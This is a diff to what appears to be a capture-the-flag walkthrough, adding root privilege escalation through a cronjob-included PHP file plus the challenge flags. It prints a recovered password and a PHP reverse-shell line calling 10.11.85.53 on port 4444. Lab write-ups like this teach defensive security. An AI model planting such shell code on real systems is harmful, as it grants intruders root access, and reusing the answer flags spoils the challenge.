@@ -53,13 +53,24 @@ Now we can open the database with the following command: `keepassxc-cli open dat
 ![image](https://github.com/user-attachments/assets/385b27b8-c68c-4cbb-96d6-b122e57be292)<br />
 To look at the password, add the `-s` flag:<br />
 ![image](https://github.com/user-attachments/assets/0944e2f0-b692-44a7-af9d-ecd504e0ddc0)<br />
-Creds found: `sysadmin:Cl0udP4ss40p4city#8700`.
-
-
-
+Creds found: `sysadmin:Cl0udP4ss40p4city#8700`. Now inside the `/home/sysadmin/scripts` directory there's a `script.php` file that's owned by root, but that I can read: <br />
+![image](https://github.com/user-attachments/assets/3dfab10f-5aef-4f2e-86cb-39459a2fa459)<br />
+This is the content of the script: <br />
+![image](https://github.com/user-attachments/assets/b65303f2-6f43-470a-8f1a-2f6892302e6d)<br />
+Now if I use [pspy64](https://github.com/DominicBreuker/pspy), I get the following output:<br />
+![image](https://github.com/user-attachments/assets/6000a74e-c667-4b4e-aab9-12a0a6e6003a)<br />
+This means that this script is a cronjob running by root.
+It essentially saves everything inside a backup folder, and then deletes everything. What's interesting is that it imports another php script called `backup.inc.php` inside the lib directory, which is owned by sysadmin!<br />
+![image](https://github.com/user-attachments/assets/0128c19c-11c2-4eff-a2ac-e66b70d7f6a4)<br />
+Every file is owned by root. But since I own the directory, I can move in and out every file I want. So the idea is to remove the `backup.inc.php` script out of this folder, and then copy it back on that folder, but this time owned by sysadmin. So first step: move the script outside the folder with `mv backup.inc.php /home/sysadmin/`. Now run `cp backup.inc.php scripts/lib/backup.inc.php`<br />
+![image](https://github.com/user-attachments/assets/ca6670c5-3a73-4b24-aa12-52c33a364197)<br />
+The script is now owned by sysadmin! We can now modify it to spawn a reverse shell as root, add the following line to the script: `$sock=fsockopen("10.11.85.53",4444);exec("sh <&3 >&3 2>&3");`<br />
+![image](https://github.com/user-attachments/assets/1e06f2f3-978f-4bb2-84d7-eedc94de6e0a)<br />
+Now open a netcat listener and wait for the reverse shell: <br />
+![image](https://github.com/user-attachments/assets/967cbbb5-5a8d-4388-978e-fc1155204dbc)<br />
 
 
 
 
 - What is the  local.txt flag? `6661b61b44d234d230d06bf5b3c075e2`
-- What is the proof.txt flag? ``
+- What is the proof.txt flag? `ac0d56f93202dd57dcb2498c739fd20e`
